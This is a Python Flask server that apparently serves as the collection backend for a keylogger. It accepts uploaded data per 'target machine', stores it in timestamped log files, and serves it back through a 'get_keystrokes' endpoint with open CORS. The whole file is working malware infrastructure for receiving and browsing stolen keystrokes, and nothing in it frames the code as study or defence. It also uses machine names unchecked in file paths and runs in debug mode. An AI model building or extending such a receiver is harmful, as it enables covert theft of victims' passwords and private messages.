from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import time
import os

DATA_FOLDER = "data"
LOG_INTERVAL = 5 * 60 

app = Flask(__name__)
CORS(app) 

last_log_info = {}  # {machine: {"time": <timestamp>, "file": <path>} }

def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    now = time.time()
    info = last_log_info.get(machine, None)

    if info is None or now - info["time"] >= LOG_INTERVAL:
        filename = generate_log_filename()
        file_path = os.path.join(machine_folder, filename)
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(log_data)
        last_log_info[machine] = {"time": now, "file": file_path}
        return jsonify({"status": "new_file", "file": file_path}), 200
    else:
        file_path = info["file"]
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(log_data)
        return jsonify({"status": "appended", "file": file_path}), 200

@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    if not os.path.exists(DATA_FOLDER):
        return jsonify({"machines": []}), 200

    machines = [
        name for name in os.listdir(DATA_FOLDER)
        if os.path.isdir(os.path.join(DATA_FOLDER, name))
    ]
    return jsonify({"machines": machines}), 200

@app.route('/api/get_keystrokes/<machine>', methods=['GET'])
def get_keystrokes(machine):
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine folder not found"}), 404

    log_files = [
        os.path.join(machine_folder, f)
        for f in os.listdir(machine_folder)
        if os.path.isfile(os.path.join(machine_folder, f)) and f.startswith("log_")
    ]
    log_files.sort()

    logs = []
    for file_path in log_files:
        filename = os.path.basename(file_path)
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()

        try:
            ts = filename.replace("log_", "").replace(".txt", "")
            date_str, time_str = ts.split("_")
            time_str = time_str.replace("-", ":")
        except Exception:
            date_str, time_str = "unknown", "unknown"

        logs.append({
            "date": date_str,
            "time": time_str,
            "content": content
        })

    return jsonify({"machine": machine, "logs": logs}), 200

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('.', path)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
